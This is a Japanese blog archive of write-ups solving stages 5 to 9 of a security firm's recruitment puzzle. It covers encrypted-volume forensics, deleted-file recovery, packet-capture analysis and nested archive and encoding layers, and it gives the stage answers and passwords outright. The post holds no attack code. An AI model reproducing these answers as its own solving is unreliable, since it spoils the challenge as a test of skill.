<p>mondai8.tcはTrueCryptファイルで、開くためのパスワードはmondai8であるとのことです。そしてこのmondai8の答えは漢字8文字ということでしょう。
TrueCryptでmondai8.tcをマウントして中を見てみました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/mondai8-files.png" alt="mondai8-files.png" /></p>

<p>こういったCTF系の問題でイメージファイルが配布されるときは、フォレンジック問題であると相場が決まっているので、TrueCryptでマウントしたらAutopsyで調査します。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/autopsy.png" alt="autopsy.png" /></p>

<p>マウントした際に表示されていたファイルになかった「今日の本.xlsx」という削除されたファイルが見つかりました。怪しいですね。
復元してファイルを開いてみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/todaysbook1.png" alt="todaysbook1.png" />
<img src="http://mzyy94.com/blog/resources/images/2015/04/15/todaysbook2.png" alt="todaysbook2.png" />
<img src="http://mzyy94.com/blog/resources/images/2015/04/15/todaysbook3.png" alt="todaysbook3.png" /></p>

<p>シート1にはアルファベットと2つの数字が書かれた行があり、シート2には、<a href="http://www.aozora.gr.jp/cards/001670/card56113.html">青空文庫の奇談クラブ</a>からコピーされたであろう本の内容が書かれていました。</p>

<p>シート3には、key:passwordに対応するanswerを入力するような空欄がありました。
このpasswordという文字列はきっとシート1のアルファベットと2つの数字に対応していて、1つ目の数字は行番号、2つ目の数字はその行の文字の位置を指しているだろうと思いました。
Excel Onlineの印刷機能でシート2をHTML形式にし、保存したのちテキストに変換して<a href="http://mzyy94.com/blog/resources/data/2015/04/15/kidanclub.txt">kidanclub.txt</a>を作成し、
シート1を基に、アルファベット<strong>&#8220;password&#8221;</strong>に対応する行から文字を抽出するコードを書きました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/print-book.png" alt="print-book.png" /></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'><span class="n">password</span> <span class="o">=</span> <span class="o">[</span>
</span><span class='line'>  <span class="o">[</span><span class="mi">119</span><span class="p">,</span><span class="mi">161</span><span class="o">]</span><span class="p">,</span> <span class="c1"># p</span>
</span><span class='line'>  <span class="o">[</span> <span class="mi">62</span><span class="p">,</span> <span class="mi">11</span><span class="o">]</span><span class="p">,</span> <span class="c1"># a</span>
</span><span class='line'>  <span class="o">[</span><span class="mi">276</span><span class="p">,</span> <span class="mi">40</span><span class="o">]</span><span class="p">,</span> <span class="c1"># s</span>
</span><span class='line'>  <span class="o">[</span><span class="mi">276</span><span class="p">,</span> <span class="mi">40</span><span class="o">]</span><span class="p">,</span> <span class="c1"># s</span>
</span><span class='line'>  <span class="o">[</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">58</span><span class="o">]</span><span class="p">,</span> <span class="c1"># w</span>
</span><span class='line'>  <span class="o">[</span><span class="mi">239</span><span class="p">,</span> <span class="mi">44</span><span class="o">]</span><span class="p">,</span> <span class="c1"># o</span>
</span><span class='line'>  <span class="o">[</span><span class="mi">236</span><span class="p">,</span>  <span class="mi">7</span><span class="o">]</span><span class="p">,</span> <span class="c1"># r</span>
</span><span class='line'>  <span class="o">[</span><span class="mi">185</span><span class="p">,</span>  <span class="mi">7</span><span class="o">]</span>  <span class="c1"># d</span>
</span><span class='line'><span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">book</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="n">password</span> <span class="k">do</span>
</span><span class='line'>    <span class="c1"># One-based numbering</span>
</span><span class='line'>  <span class="n">key</span> <span class="o">+=</span> <span class="n">book</span><span class="o">[</span><span class="n">i</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">-</span> <span class="mi">1</span><span class="o">][</span><span class="n">i</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">-</span> <span class="mi">1</span><span class="o">]</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="nb">p</span> <span class="n">key</span>
</span></code></pre></td></tr></table></div></figure>


<p>引数に先ほど作成した<a href="http://mzyy94.com/blog/resources/data/2015/04/15/kidanclub.txt">kidanclub.txt</a>を与えて実行してみると、漢字8文字のパスワードを得ることができました。</p>

<!--
$ ruby mondai8.rb kidanclub.txt
"意気揚揚明鏡止水"
-->


<p>mondai5同様、非ASCII文字のパスワードなので、<code>7z.exe</code>を利用してmondai9.zipを解凍しておしまいです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>&gt; 7z.exe x mondai9.zip
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.35 beta  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2014 Igor Pavlov  2014-12-07
</span><span class='line'>
</span><span class='line'>Processing archive: mondai9.zip
</span><span class='line'>
</span><span class='line'>Extracting  mondai10.tc
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>Extracting  mondai9.pkt
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Files: 2
</span><span class='line'>Size:       68517107
</span><span class='line'>Compressed: 68241943
</span><span class='line'>
</span><span class='line'>Kernel  <span class="nv">Time</span> <span class="o">=</span>     0.046 <span class="o">=</span>    1%
</span><span class='line'>User    <span class="nv">Time</span> <span class="o">=</span>     0.733 <span class="o">=</span>   16%
</span><span class='line'>Process <span class="nv">Time</span> <span class="o">=</span>     0.780 <span class="o">=</span>   17%    Virtual  <span class="nv">Memory</span> <span class="o">=</span>      <span class="m">2</span> MB
</span><span class='line'>Global  <span class="nv">Time</span> <span class="o">=</span>     4.536 <span class="o">=</span>  100%    Physical <span class="nv">Memory</span> <span class="o">=</span>      <span class="m">4</span> MB
</span></code></pre></td></tr></table></div></figure>




<!--
$ wine 7z.exe x mondai9.zip -p意気揚揚明鏡止水

7-Zip [64] 9.35 beta  Copyright (c) 1999-2014 Igor Pavlov  2014-12-07

Processing archive: mondai9.zip

Extracting  mondai10.tc
Extracting  mondai9.pkt

Everything is Ok

Files: 2
Size:       68517107
Compressed: 68241943

Kernel  Time =     0.046 =    5%
User    Time =     0.733 =   87%
Process Time =     0.780 =   93%    Virtual  Memory =      2 MB
Global  Time =     0.836 =  100%    Physical Memory =      4 MB
-->


<h1>mondai9</h1>

<p>mondai9.pktは<code>file</code>コマンドによると、little-endianなpcapファイルのようです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file mondai9.pkt
</span><span class='line'>mondai9.pkt: tcpdump capture file <span class="o">(</span>little-endian<span class="o">)</span> - version 2.4 <span class="o">(</span>Ethernet, capture length 65535<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>また、拡張子pktはWindowsの関連付けでは、Wiresharkで開けるファイルとなっています。
早速Wiresharkで見てみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/mondai9-wireshark1.png" alt="mondai9-wireshark1.png" /></p>

<p>ざっと目を通した感じ、<code>tcpdump -f 'tcp port 80'</code>によって、fast-uploader.comにアクセスしている様子をキャプチャしたもののようです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/mondai9-wireshark2.png" alt="mondai9-wireshark2.png" /></p>

<p>httpリクエストで絞り込むと、POSTメソッドによってファイルを幾つかアップロードしているようです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/mondai9-wireshark3.png" alt="mondai9-wireshark3.png" /></p>

<p>アップロードしたファイルを抽出しようとメニューのHTTP objectから抽出を試みたのですが、Wiresharkでは<em>multipart/form-data</em>としてPOSTされたデータ中のファイルはうまく取り出せないようなので、NetworkMinerを使います。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/mondai9-networkminer.png" alt="mondai9-networkminer.png" /></p>

<p>NetworkMinerで4つのアップロードされたファイルを抽出したところ、文字化けした2つのExcelファイルと1つのWordファイル、パスワードのかかったzipファイルがありました。
パスワードをクラックするとWordファイルが出てきたので、4つのOfficeファイルを開いてみました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/office-files.png" alt="office-files.png" /></p>

<p>どのOfficeファイルにも文字の記入はなく、答えらしきものがみつかりません。
ファイル名で検索してみたりいろいろしたあと、ファイルのメタ情報を詮索してみることにしたところ、文字化けしたWordファイルにそれらしきものがあることに気づきました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/word-property.png" alt="word-property.png" /></p>

<p>これパスワードとしてmondai10.tcをTrueCryptでマウントしてみたところ、開くことができました。</p>

<p>明日は最終問題、mondai10のWrite-upを公開します。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ネットエージェント最終面接問題 Write-up その2]]></title>
    <link href="http://mzyy94.com/blog/2015/04/14/netagent-mondai5-6/"/>
    <updated>2015-04-14T00:05:14+09:00</updated>
    <id>http://mzyy94.com/blog/2015/04/14/netagent-mondai5-6</id>
    <content type="html"><![CDATA[<p>ネットニュースサイトにも取り上げられ、盛り上がりを見せていたネットエージェントのいきなり最終面接mondaiのWrite-upその2です。</p>

<ul>
<li><a href="http://nlab.itmedia.co.jp/nl/articles/1503/30/news143.html">「解けたらいきなり最終面接」 ネットエージェント、今年も新卒向けに“難問”出題 - ねとらぼ</a></li>
</ul>


<p>某所ではこれらのmondaiを10分で解けたとの声が上がっているようで、世の中にはこの記事とは比べ物にならないくらい効率のよい解き方をしている方がいるようです。それらの解法と比べると、この記事の解法は全部解くのに数日かかっているので、内容が無いも同然という位置付けとなります。
もし10分で解いた猛者たちの解法が公開されていたら、この記事ではなくそちらをご覧になることをお勧めします。</p>

<p>昨日の<a href="http://mzyy94.com/blog/2015/04/13/netagent-mondai1-4/">mondai1からmondai4までのWrite-upの記事</a>に続き、今日はmondai5とmondai6のWrite-upを公開します。</p>

<!-- more -->


<h1>mondai5</h1>

<p>mondai4.zipを解凍した際に出てきたファイル、mondai5は何だろうかと<code>file</code>コマンドを用いて調べると、ASCII textであるらしいことがわかります。テキストエディタで開いてみると、各行76文字で折り返されている、長いBASE64エンコードされた文字列が記載されていました。
そのまま<code>base64</code>に食べさせてデコードします。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>base64 -D mondai5 -o mondai5-1
</span></code></pre></td></tr></table></div></figure>


<p>デコードしてできたmondai5-1を<code>file</code>コマンドで調べてみるとまたもASCII textで、内容も先ほどと同じように、各行76文字で折り返されたBASE64エンコード文字列が書かれています。
同じように<code>base64</code>でデコードしてmondai5-2を作成します。</p>

<p>作成したmondai5-2を調べると、なんとmondai5、mondai5-1と同じ形で、またもBASE64エンコード文字列が書かれてるASCII textでした。
これもまた<code>base64</code>でデコードしてmondai5-3を作成します。
できあがった<strong>mondai5-3も同じ形式</strong>なので、同様の手順でmondai5-4を作成します。</p>

<p>mondai5-4は<code>file</code>コマンドで調べると、以下のように返してきます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file mondai5-4
</span><span class='line'>mondai5-4: uuencoded or xxencoded text
</span></code></pre></td></tr></table></div></figure>


<p>uuencodeされた文字列が格納されているようです。
<code>uudecode</code>コマンドでmondai5-5を作成します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>uudecode -o mondai5-5 mondai5-4
</span></code></pre></td></tr></table></div></figure>


<p>mondai5-5を調べてみるとgzip圧縮ファイルだということがわかります。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file mondai5-5
</span><span class='line'>mondai5-5: gzip compressed data, from Unix, last modified: Thu Mar <span class="m">19</span> 17:31:56 2015
</span></code></pre></td></tr></table></div></figure>


<p><code>gunzip</code>で解凍してmondai5-6を作成します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>gunzip -d mondai5-5 -c &gt; mondai5-6
</span></code></pre></td></tr></table></div></figure>


<p>mondai5-6を調査してみましょう。<code>file</code>コマンドによるとzip圧縮ファイルとのことなので、中身を調べてみます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file mondai5-6
</span><span class='line'>mondai5-6: Zip archive data, at least v1.0 to extract
</span><span class='line'><span class="nv">$ </span>7z l mondai5-6
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Listing archive: mondai5-6
</span><span class='line'>
</span><span class='line'>--
</span><span class='line'><span class="nv">Path</span> <span class="o">=</span> mondai5-6
</span><span class='line'><span class="nv">Type</span> <span class="o">=</span> zip
</span><span class='line'>Physical <span class="nv">Size</span> <span class="o">=</span> 1472
</span><span class='line'>
</span><span class='line'>   Date      Time    Attr         Size   Compressed  Name
</span><span class='line'>------------------- ----- ------------ ------------  ------------------------
</span><span class='line'>2015-03-18 18:50:16 ....A         <span class="m">1332</span>         <span class="m">1332</span>  nek
</span><span class='line'>------------------- ----- ------------ ------------  ------------------------
</span><span class='line'>                                  <span class="m">1332</span>         <span class="m">1332</span>  <span class="m">1</span> files, <span class="m">0</span> folders
</span></code></pre></td></tr></table></div></figure>


<p>nekというファイルが格納されているようです。<code>7z</code>コマンドで解凍してnekを取り出します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>7z x mondai5-6
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Processing archive: mondai5-6
</span><span class='line'>
</span><span class='line'>Extracting  nek
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Size:       1332
</span><span class='line'>Compressed: 1472
</span></code></pre></td></tr></table></div></figure>


<p>nekを調べると、bzip圧縮ファイルとのことなので、<code>bzip2</code>コマンドで解凍します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file nek
</span><span class='line'>nek: bzip2 compressed data, block <span class="nv">size</span> <span class="o">=</span> 900k
</span><span class='line'><span class="nv">$ </span>bzip2 -d nek -c &gt; mondai5-8
</span></code></pre></td></tr></table></div></figure>


<p>mondai5-8は7z圧縮ファイルとのことなので、<code>7z</code>コマンドで解凍します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file mondai5-8
</span><span class='line'>mondai5-8: 7-zip archive data, version 0.3
</span><span class='line'><span class="nv">$ </span>7z x mondai5-8
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Processing archive: mondai5-8
</span><span class='line'>
</span><span class='line'>Extracting  n
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Size:       974
</span><span class='line'>Compressed: 1082
</span></code></pre></td></tr></table></div></figure>


<p>これによって、nというファイルが展開されます。このファイルはrar圧縮ファイルとのことなので<code>unrar</code>で解凍します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file n
</span><span class='line'>n: RAR archive data, v1d, os: Win32
</span><span class='line'><span class="nv">$ </span>unrar x n
</span><span class='line'>
</span><span class='line'>UNRAR 5.20 beta <span class="m">1</span> freeware      Copyright <span class="o">(</span>c<span class="o">)</span> 1993-2014 Alexander Roshal
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Extracting from n
</span><span class='line'>
</span><span class='line'>Extracting  ne                                                        OK
</span><span class='line'>All OK
</span></code></pre></td></tr></table></div></figure>


<p>neというファイルが出てきましたね。neはlha圧縮されたファイルとのことなので、<code>lha</code>コマンドで解凍します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file ne
</span><span class='line'>ne: LHarc 1.x/ARX archive data <span class="o">[</span>lh0<span class="o">]</span>
</span><span class='line'><span class="nv">$ </span>lha x ne
</span><span class='line'>nex     - Melted   :  o
</span></code></pre></td></tr></table></div></figure>


<p>nexファイルが出来上がりました。はい。調べるとxz圧縮なので<code>xz</code>で解凍します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file nex
</span><span class='line'>nex: xz compressed data
</span><span class='line'><span class="nv">$ </span>xz -d nex -c &gt; mondai5-12
</span></code></pre></td></tr></table></div></figure>


<p>ちょっと疲れたのでコーヒーを飲みます。</p>

<p>mondai5-12を<code>file</code>コマンドで調べると、なんと、判定してくれません！（貧弱なfileめ）</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file mondai5-12
</span><span class='line'>mondai5-12: data
</span></code></pre></td></tr></table></div></figure>


<p>マジックナンバーを見てみると、MSWIMとなってることが確認出ました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>xxd mondai5-12 <span class="p">|</span> head -2
</span><span class='line'>0000000: 4d53 <span class="m">5749</span> 4d00 <span class="m">0000</span> d000 <span class="m">0000</span> 000d <span class="m">0100</span>  MSWIM...........
</span><span class='line'>0000010: <span class="m">8000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> 4ef7 dcb4 6e01 bfe4  ........N...n...
</span></code></pre></td></tr></table></div></figure>


<p>Googleで「&#8221;MSWIM&#8221; magic number」として調べると、1番目に次のページがヒットします。</p>

<p><a href="http://en.wikipedia.org/wiki/Windows_Imaging_Format">Windows Imaging Format - Wikipedia, the free encyclopedia</a></p>

<p>このWikipediaの記事の最後に、<em>LZX圧縮だし7zとかで開けるよ（意訳）</em>と書いてあるので、<code>7z</code>で展開を試みてみます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>7z x mondai5-12
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Processing archive: mondai5-12
</span><span class='line'>
</span><span class='line'>Extracting  QRcode
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Size:       16052
</span><span class='line'>Compressed: 17310
</span></code></pre></td></tr></table></div></figure>


<p>あっさりと展開でき、QRcodeという名のファイルが出てきました。
このファイルの形式はSun raster image dataとのことです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file QRcode
</span><span class='line'>QRcode: Sun raster image data, <span class="m">123</span> x 123, 8-bit, RGB colormap
</span></code></pre></td></tr></table></div></figure>


<p>画像データらしいですが、開けるアプリケーションを持ち合わせていないので、ImageMagickに投げ込んでみます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>convert QRcode qrcode.png
</span><span class='line'><span class="nv">$ </span>file qrcode.png
</span><span class='line'>qrcode.png: PNG image data, <span class="m">123</span> x 123, 4-bit grayscale, non-interlaced
</span></code></pre></td></tr></table></div></figure>


<p>さすがImageMagick難なく変換できたすごい！
簡単に開ける形式の画像ファイルができたので開いてみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/14/qrcode.png" alt="qrcode.png" /></p>

<p><a href="http://mzyy94.com/blog/2014/12/07/seccon2014-online/">半分食べられてしまったパンケーキ</a>ではなく、普通のQRコードでした。</p>

<p>適当なQRコードリーダーで読み込むと、以下のような文字列が得られます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>+BCcENQQxBEMEQAQwBEgEOgQw-
</span></code></pre></td></tr></table></div></figure>


<p>+で始まり-で終わる文字列、そう、UTF-7エンコード文字列です。
+と-の間はUTF-16のBASE64エンコード文字列（ただしパッディングの=が省略されている）なので、<code>nkf</code>で変換してみます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="nb">echo </span>BCcENQQxBEMEQAQwBEgEOgQw <span class="p">|</span> nkf -mB -W16B
</span></code></pre></td></tr></table></div></figure>




<!--
Чебурашка
-->


<p>何やらロシア語らしきものが出てきます。意味を調べると、ロシアの絵本のキャラクターとのことです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/14/Cheburashka.jpg" alt="Cheburashka.jpg" /></p>

<p>これ以上解くものがなくなったので、これがmondai5の答えのようです。しかし<code>7z</code>コマンドで解凍を試みても、パスワードが違うと言われる始末です。</p>

<p>p7zipの<code>7z</code>コマンドによる非ASCII文字パスワード付き7zipの解凍・圧縮は、環境によって正しく処理されないということを、以前日本語パスワードをセットしたときに経験したのを思い出し、本家7zipの<code>7z.exe</code>を使って解凍をしてみます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>wine 7z.exe x mondai6.zip
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.35 beta  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2014 Igor Pavlov  2014-12-07
</span><span class='line'>
</span><span class='line'>Processing archive: mondai6.zip
</span><span class='line'>
</span><span class='line'>Extracting  hint6.txt
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>Extracting  mondai6.txt
</span><span class='line'>Extracting  mondai7.zip
</span><span class='line'>
</span><span class='line'>Everything is Ok
